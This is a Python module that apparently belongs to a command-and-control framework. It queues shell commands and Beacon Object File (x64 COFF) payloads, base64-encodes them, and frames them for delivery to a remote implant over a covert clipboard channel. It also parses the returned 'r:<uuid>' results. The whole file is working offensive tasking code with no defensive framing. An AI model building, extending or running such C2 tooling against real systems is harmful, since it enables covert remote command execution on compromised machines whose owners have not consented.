import base64
import json
import re
import struct
import uuid
from dataclasses import dataclass

UUID_RE = re.compile(
    r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$"
)
CLIPBOARD_COMMAND_RE = re.compile(
    r"^c:([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}):(.*)$",
    re.DOTALL,
)

COMMAND_TYPE_SHELL = "shell"
COMMAND_TYPE_BOF = "bof"
BOF_MAX_OBJECT_BYTES = 256 * 1024
IMAGE_FILE_MACHINE_AMD64 = 0x8664


@dataclass
class QueuedCommand:
    id: str
    command: str
    type: str = COMMAND_TYPE_SHELL
    cmd: str | None = None
    name: str | None = None
    object_b64: str | None = None
    args_b64: str | None = None

    @staticmethod
    def create_shell(command: str) -> "QueuedCommand":
        return QueuedCommand(
            id=str(uuid.uuid4()),
            command=command,
            type=COMMAND_TYPE_SHELL,
            cmd=command,
        )

    @staticmethod
    def create_bof(name: str, object_b64: str, args_b64: str = "") -> "QueuedCommand":
        return QueuedCommand(
            id=str(uuid.uuid4()),
            command=f"bof:{name}",
            type=COMMAND_TYPE_BOF,
            name=name,
            object_b64=object_b64,
            args_b64=args_b64 or "",
        )

    def to_payload_body(self) -> dict[str, str]:
        if self.type == COMMAND_TYPE_BOF:
            payload: dict[str, str] = {
                "type": COMMAND_TYPE_BOF,
                "name": self.name or "",
                "object_b64": self.object_b64 or "",
            }
            if self.args_b64:
                payload["args_b64"] = self.args_b64
        else:
            payload = {
                "type": COMMAND_TYPE_SHELL,
                "cmd": self.cmd or self.command,
            }
        return payload

    def to_delivery_json(self) -> str:
        payload = {"id": self.id, **self.to_payload_body()}
        return json.dumps(payload, separators=(",", ":"))

    def to_clipboard(self) -> str:
        return f"c:{self.id}:{json.dumps(self.to_payload_body(), separators=(',', ':'))}"

    def to_dict(self) -> dict[str, str]:
        return {
            "id": self.id,
            "command": self.command,
            "type": self.type,
        }


def validate_coff_object(data: bytes) -> None:
    if len(data) < 20:
        raise ValueError("COFF object too small")
    if data[0:2] != b"\x64\x86":
        raise ValueError("COFF object must be x64 (AMD64)")
    machine = struct.unpack("<H", data[0:2])[0]
    if machine != IMAGE_FILE_MACHINE_AMD64:
        raise ValueError("COFF object must be AMD64")


def encode_bof_object(data: bytes) -> str:
    validate_coff_object(data)
    if len(data) > BOF_MAX_OBJECT_BYTES:
        raise ValueError(f"BOF object exceeds {BOF_MAX_OBJECT_BYTES} bytes")
    return base64.b64encode(data).decode("ascii")


def parse_delivery_payload(text: str) -> dict | None:
    try:
        payload = json.loads(text)
    except json.JSONDecodeError:
        return None
    if not isinstance(payload, dict):
        return None
    return payload


def is_bof_payload(payload: dict | str) -> bool:
    if isinstance(payload, str):
        parsed = parse_delivery_payload(payload)
        return bool(parsed and parsed.get("type") == COMMAND_TYPE_BOF)
    return payload.get("type") == COMMAND_TYPE_BOF


def parse_result_payload(plaintext: str) -> tuple[str, str] | None:
    if not plaintext.startswith("r:"):
        return None
    rest = plaintext[2:]
    if not rest:
        return None
    newline = rest.find("\n")
    if newline == -1:
        result_id = rest.strip()
        output = ""
    else:
        result_id = rest[:newline].strip()
        output = rest[newline + 1 :]
    if not UUID_RE.match(result_id):
        return None
    return result_id, output


def parse_command_clipboard(text: str) -> QueuedCommand | None:
    match = CLIPBOARD_COMMAND_RE.match(text)
    if not match:
        return None
    command_id = match.group(1)
    payload_text = match.group(2)
    payload = parse_delivery_payload(payload_text)
    if payload:
        command_type = payload.get("type", COMMAND_TYPE_SHELL)
        if command_type == COMMAND_TYPE_BOF:
            return QueuedCommand(
                id=command_id,
                command=f"bof:{payload.get('name', '')}",
                type=COMMAND_TYPE_BOF,
                name=payload.get("name"),
                object_b64=payload.get("object_b64"),
                args_b64=payload.get("args_b64", ""),
            )
        return QueuedCommand(
            id=command_id,
            command=payload.get("cmd", ""),
            type=COMMAND_TYPE_SHELL,
            cmd=payload.get("cmd", ""),
        )
    return QueuedCommand(id=command_id, command=payload_text, type=COMMAND_TYPE_SHELL, cmd=payload_text)
